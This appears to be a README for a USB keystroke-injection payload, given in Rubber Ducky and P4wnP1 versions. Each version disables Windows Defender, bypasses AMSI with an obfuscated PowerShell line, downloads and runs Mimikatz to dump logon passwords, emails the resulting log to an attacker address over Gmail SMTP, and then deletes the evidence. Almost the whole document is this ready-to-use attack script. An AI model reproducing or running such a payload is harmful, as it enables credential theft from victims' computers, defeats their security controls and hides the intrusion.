# Credentials - Mimikatz + Send Result to Mail

## Description

This is a simple HIDScript that disable windows defender, run Mimikatz (logonPasswords) and save the result to log.
Then it send to your mail the log as attachment, delete Mimikatz and log files and finally re-enable windows defender.

## Requirement

1. First note this script has been created and tested under Windows 11 Build 22000.

2. I used a QWERTZ keyboard to do this ("ch" layout), so you may need to change that.

3. Change the sender e-mail/password and set the attacker email that will receive the mail with the Mimikatz log attached to.

4. To deliver the mail, you need first to allow less secure app to access you'r Gmail account. To do this you need first to disable 2FA, then enable less secure app (<a href="https://myaccount.google.com/lesssecureapps">direct link</a>). I suggest to create a Gmail account only for this purpose, instead of using you'r personal account if you are using Gmail. As you need to disable 2FA it expose you'r account.

## Rubber/Pico Ducky Version

```bash
GUI r
DELAY 1000
STRING windowsdefender:
ENTER
DELAY 1000
ENTER
DELAY 1000
TAB
TAB
TAB
TAB
ENTER
DELAY 1000
SPACE
DELAY 1000
LEFT
DELAY 1000
ENTER
DELAY 1000
GUI r
DELAY 1000
STRING powershell.exe start-process powershell -verb runas
ENTER
DELAY 1500
LEFT
ENTER
DELAY 1000
STRING [Ref].Assembly.GetType('System.Management.Automation.Amsi'+[char]85+'tils').GetField('ams'+[char]105+'InitFailed','NonPublic,Static').SetValue($null,$true)
ENTER
DELAY 1000
STRING (New-Object System.Net.WebClient).DownloadFile('https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip','C:\\mimikatz_trunk.zip')
ENTER
DELAY 1000
STRING cd /
ENTER
DELAY 1000
STRING mkdir mimi
ENTER
DELAY 1000
STRING Expand-Archive -Path mimikatz_trunk.zip -DestinationPath C:\\mimi
ENTER
DELAY 1500
STRING cd mimi\\x64
ENTER
DELAY 1000
STRING .\\mimikatz.exe
ENTER
DELAY 1000
STRING log log.txt
ENTER
DELAY 1000
STRING privilege::debug
ENTER
DELAY 1000
STRING sekurlsa::logonPasswords
ENTER
DELAY 1000
STRING exit
ENTER
DELAY 1000
STRING $emailSmtpServer = 'smtp.gmail.com';$emailSmtpServerPort = '587';$emailSmtpUser = 'sender@gmail.com';$emailSmtpPass = 'YourSuperPassword';$emailMessage = New-Object System.Net.Mail.MailMessage;$emailMessage.From = 'HIDScript LogonPassword Mimikatz <sender@gmail.com>';$emailMessage.To.Add('attacker@protonmail.com');$emailMessage.Body = 'W00tW00t, You received one log file, see attachment!';$SMTPClient = New-Object System.Net.Mail.SmtpClient( $emailSmtpServer , $emailSmtpServerPort );$SMTPClient.EnableSsl = $true;$SMTPClient.Credentials = New-Object System.Net.NetworkCredential( $emailSmtpUser , $emailSmtpPass );$attachment = 'C:\\mimi\\x64\\log.txt';$emailMessage.Attachments.Add($attachment);$SMTPClient.Send($emailMessage)
ENTER
DELAY 2000
STRING cd /
ENTER
DELAY 200
STRING rmdir mimi
ENTER
DELAY 1000
STRING T
ENTER
DELAY 1000
STRING del mimikatz_trunk.zip
ENTER
DELAY 1000
STRING exit
ENTER
DELAY 1000
SPACE
DELAY 1000
ALT F4
```

## P4wnP1 Version

```bash
layout("ch")
press("GUI r")
delay(1000)
type("windowsdefender:")
press("ENTER")
delay(1000)
press("ENTER")
delay(1000)
press("TAB")
press("TAB")
press("TAB")
press("TAB")
press("ENTER")
delay(1000)
press("SPACE")
delay(1000)
press("LEFT")
delay(1000)
press("ENTER")
delay(1000)
press("GUI r")
delay(200)
type("powershell.exe start-process powershell -verb runas")
press("ENTER")
delay(1500)
press("LEFT")
press("ENTER")
delay(1000)
type("[Ref].Assembly.GetType('System.Management.Automation.Amsi'+[char]85+'tils').GetField('ams'+[char]105+'InitFailed','NonPublic,Static').SetValue($null,$true)")
press("ENTER")
delay(1000)
type("(New-Object System.Net.WebClient).DownloadFile('https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip','C:\\mimikatz_trunk.zip')")
press("ENTER")
delay(1000)
type("cd /")
press("ENTER")
delay(500)
type("mkdir mimi")
press("ENTER")
delay(500)
type("Expand-Archive -Path mimikatz_trunk.zip -DestinationPath C:\\mimi")
press("ENTER")
delay(1500)
type("cd mimi")
press("ENTER")
delay(500)
type("cd x64")
press("ENTER")
delay(500)
type(".\\mimikatz.exe")
press("ENTER")
delay(1000)
type("log log.txt")
press("ENTER")
delay(1000)
type("privilege::debug")
press("ENTER")
delay(1000)
type("sekurlsa::logonPasswords")
press("ENTER")
delay(1000)
type("$emailSmtpServer = 'smtp.gmail.com';$emailSmtpServerPort = '587';$emailSmtpUser = 'sender@gmail.com';$emailSmtpPass = 'YourSuperPassword';$emailMessage = New-Object System.Net.Mail.MailMessage;$emailMessage.From = 'HIDScript LogonPassword Mimikatz <sender@gmail.com>';$emailMessage.To.Add('attacker@protonmail.com');$emailMessage.Body = 'W00tW00t, You received one log file, see attachment!';$SMTPClient = New-Object System.Net.Mail.SmtpClient( $emailSmtpServer , $emailSmtpServerPort );$SMTPClient.EnableSsl = $true;$SMTPClient.Credentials = New-Object System.Net.NetworkCredential( $emailSmtpUser , $emailSmtpPass );$attachment = 'C:\\mimi\\x64\\log.txt';$emailMessage.Attachments.Add($attachment);$SMTPClient.Send($emailMessage)")
press("ENTER")
delay(2000)
type("cd /")
press("ENTER")
type("rmdir mimi")
press("ENTER")
delay(1000)
type("T")
press("ENTER")
delay(1000)
type("del mimikatz_trunk.zip")
press("ENTER")
delay(500)
type("exit")
press("ENTER")
delay(1000)
press("SPACE")
delay(1000)
press("ALT F4")

```
